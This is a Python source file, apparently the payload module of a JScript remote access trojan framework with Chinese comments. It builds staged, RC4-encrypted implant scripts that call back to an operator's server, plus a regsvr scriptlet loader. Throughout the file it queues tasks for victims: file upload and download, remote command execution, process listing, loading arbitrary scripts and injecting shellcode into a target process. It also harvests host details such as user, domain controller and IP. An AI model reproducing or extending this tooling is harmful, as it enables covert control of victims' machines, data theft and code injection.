#!/usr/bin/env python3
# coding:utf-8
from base64 import b64decode, b64encode
from binascii import unhexlify
from .color import BOLD
from .log import Log
from .cipher import ARC4


def load_template_js(template_name):
    with open(template_name) as f:
        return f.read()


def decode_certutil_base64(data):
    alldata = data.splitlines()
    if "-----BEGIN CERTIFICATE-----" in alldata[0] and "-----END CERTIFICATE-----" in alldata[-1]:
        return b64decode("".join(alldata[1:-1]))
    else:
        return ''


def encode_certutil_base64(data):
    bcode = b64encode(data)
    alldata = [bcode[i:i+64].decode() for i in range(0, len(bcode), 64)]

    return '{}{}{}'.format('-----BEGIN CERTIFICATE-----|', '|'.join(alldata), '|-----END CERTIFICATE-----')


def var_process(context, args):
    for k, v in args.items():
        context = context.replace(k, str(v))

    return context


class Payload():
    def __init__(self):
        pass

    @classmethod
    def init(cls, server_addr, server_port):
        context = load_template_js('template/init.js')
        context = var_process(
            context, {'~URL_STAGE~': 'http://{}:{}/stage'.format(server_addr, server_port)})

        return context.encode()

    @classmethod
    def stage(cls, server_addr, server_port,rc4_key):
        context = load_template_js('template/stage.js')
        context = var_process(
            context, {'~URL_RAT~': 'http://{}:{}/rat'.format(server_addr, server_port), '~KEY~': rc4_key})

        return context.encode()

    @classmethod
    def rat(cls, server_addr, server_port, rc4_key, sleep_time):
        context = load_template_js('template/rat.js')
        js_vars = {'~URL_RUN~': 'http://{}:{}'.format(
            server_addr, server_port), '~KEY~': rc4_key, '~SLEEP~': str(sleep_time)}
        context = var_process(context, js_vars)
        context = ARC4.encrypt(context.encode(),rc4_key.encode())

        return context#.encode()

    @classmethod
    def regsvr(cls, server_addr, server_port):
        init_js = cls.init(server_addr, server_port).decode()
        context = load_template_js('template/regsvr.xml')
        context = var_process(
            context, {'~URL_RAT~': init_js})

        return context.encode()

    '''
    对shellcode进行base64编码处理
    Forked from Koaidc shellcode_dotnet2js.py
    '''

    def __shellcode_b64(self, text):
        index = 0
        ret = '"'
        for c in text:
            ret += str(c)
            index += 1
            if index % 100 == 0:
                ret += '"+\r\n"'

        ret += '"'
        return ret

    '''
    获取任务执行的payload
    '''

    def get_payload(self, payload_type, job_id, kwargs):
        # 读取模板文件，替换JOBID
        self.context = load_template_js('template/{}.js'.format(payload_type))
        js_vars = {'~JOB_ID~': str(job_id)}
        # 不同的payload的替换和处理
        # 上传
        if payload_type == 'upload':
            with open(kwargs['local_pathname'], 'rb') as f:
                data = encode_certutil_base64(bytes(f.read()))
            js_vars['~REMOTE_PATHNAME~'] = kwargs['remote_pathname'].replace(
                '\\', '\\\\')
            js_vars['~UPLOAD_DATA~'] = data
        # 下载
        elif payload_type == 'download':
            js_vars['~REMOTE_PATHNAME~'] = kwargs['remote_pathname'].replace(
                '\\', '\\\\')
        # 显示远程文本文件
        elif payload_type == 'cat':
            js_vars['~REMOTE_PATHNAME~'] = kwargs['remote_pathname']
        # 显示进程信息
        elif payload_type == 'ps':
            js_vars['~CMD~'] = 'cmd.exe /c tasklist /V'
        # 运行程序、执行shell命令
        elif payload_type == 'run' or payload_type == 'shell':
            js_vars['~CMD~'] = kwargs['cmd']
        # 设置sleep时间
        elif payload_type == 'sleep':
            js_vars['~SLEEP~'] = kwargs['sleep']
        # 加载jscript脚本
        elif payload_type == 'js':
            with open(kwargs['local_pathname']) as f:
                js_vars['~JS_SCRIPT~'] = f.read()
        # shellcode注入
        elif payload_type == 'inject':
            js_vars['~PID~'] = kwargs['pid']
            js_vars['~SC_B64~'] = self.__shellcode_b64(kwargs['shellcode'])
            js_vars['~DLLCOMMANDS~'] = ''
            js_vars['~DLLOFFSET~'] = '0'

        # 替换变量
        self.context = var_process(self.context, js_vars)
        return self.context.encode()
    '''
    获取基本信息任务执行返回时的处理
    '''

    def job_info(self, response_text):
        if len(response_text) <= 0:
            return None

        info_array = response_text.split('///')
        if len(info_array) == 7:
            def p(x, y): return print('{}:{}'.format(BOLD(x),  info_array[y]))
            p('USER', 0)
            p('HOST', 1)
            p('OS', 2)
            p('DC', 3)
            p('ARCH', 4)
            p('CWD', 5)
            p('IP', 6)

            Log.log_message(response_text, log_type=Log.JOB_RES, output=False)
            return info_array
        else:
            Log.log_message(response_text, log_type=Log.JOB_RES)
            return None
    '''
    下载任务的返回数据处理：base64解码后写入到文件中
    '''

    def job_download(self, response_text, args):
        if 'fail' in response_text:
            Log.log_message(response_text, log_type=Log.JOB_RES)
        else:
            data = decode_certutil_base64(response_text)
            try:
                with open(args['local_pathname'], 'wb') as f:
                    f.write(data)
                Log.log_message('[download finish]', log_type=Log.JOB_RES)
            except Exception as ex:
                # raise
                Log.log_message('[download fail:{}]'.format(
                    ex), log_type=Log.JOB_RES)

    '''
    格式化输出系统进程信息
    '''

    def job_ps(self, response_text, args):
        lines = response_text.split('\n')
        lines.pop(0)
        lines.pop(0)
        columns = lines.pop(0).split(' ')
        p = []
        col_start = 0
        for c in columns:
            p.append({'start': col_start, 'end': col_start+len(c)})
            col_start += len(c)+1

        message = []
        message.append('{:<25} {:>8} {:<16} {:<40} {:<40}'.format('IMAGE',
                                                                  'PID', 'SESSION', 'USER', 'CMDLINE'))
        for line in lines:
            image = line[p[0]['start']:p[0]['end']]
            pid = line[p[1]['start']:p[1]['end']]
            session = line[p[2]['start']:p[2]['end']]
            user = line[p[6]['start']:p[6]['end']]
            cmdline = line[p[8]['start']:p[8]['end']]
            message.append('{:<25} {:>8} {:<16} {:<40} {:<40}'.format(image.strip(), pid.strip(
            ), session.strip(), user.strip(), cmdline.strip()))

        Log.log_message('\n'.join(message), log_type=Log.JOB_RES)

    '''
    对任务返回数据进行处理
    '''

    def payload_callback(self, response_text, job_type, args):
        if job_type == 'info':
            self.job_info(response_text)
        elif job_type == 'ps':
            self.job_ps(response_text, args)
        elif job_type == 'download':
            self.job_download(response_text, args)
        else:
            Log.log_message(response_text, log_type=Log.JOB_RES)
